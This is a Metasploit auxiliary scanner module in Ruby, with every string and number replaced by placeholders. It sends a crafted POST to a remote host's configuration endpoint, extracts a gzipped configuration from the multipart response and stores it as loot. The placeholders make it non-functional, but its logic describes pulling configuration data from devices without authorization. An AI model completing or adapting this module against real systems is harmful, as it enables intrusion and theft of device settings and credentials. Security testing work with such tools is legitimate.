require <str> class Metasploit4 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpClient include Msf :: Auxiliary :: Report include Msf :: Auxiliary :: Scanner def initialize super ( <str> = > <str> , <str> = > <str> , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE ) register_options ( [ Opt :: RPORT ( <int> ) , OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) register_autofilter_ports ( [ <int> ] ) deregister_options ( <str> ) end def run_host ( ip ) @uri = normalize_uri ( target_uri . path ) @uri << <str> if @uri [ - <int> , <int> ] != <str> print_status ( <str> ) uri = normalize_uri ( @uri , <str> ) res = send_request_cgi ( { <str> = > uri , <str> = > <str> } ) if not res print_error ( <str> ) return end access_configuration end def access_configuration data = <str> + <str> data << <str> + <str> data << <str> + <str> data << <str> + <str> data << <str> + <str> data << <str> + <str> data << <str> + <str> data << <str> + <str> data << <str> + <str> data << <str> + <str> data << <str> + <str> data << <str> + <str> data << <str> + <str> data << <str> print_status ( <str> ) uri = normalize_uri ( @uri , <str> ) res = send_request_cgi ( { <str> = > uri , <str> = > <str> , <str> = > <str> , <str> = > data , <str> = > { <str> = > <str> , } } ) if res and res . code == <int> if res . headers [ <str> ] =~ <str> boundary = $1 end if not boundary or boundary . empty? print_error ( <str> ) return end if res . body =~ <str> cid = $1 end if not cid or cid . empty? print_error ( <str> ) return end if res . body =~ <str> cid <str> boundary <str> loot = Rex :: Text . ungzip ( $1 ) end if not loot or loot . empty? print_error ( <str> ) return end path = store_loot ( <str> , <str> , rhost , loot , cid , <str> rhost <str> ) print_status ( <str> path <str> ) print_status ( <str> ) return end print_error ( <str> ) end end 
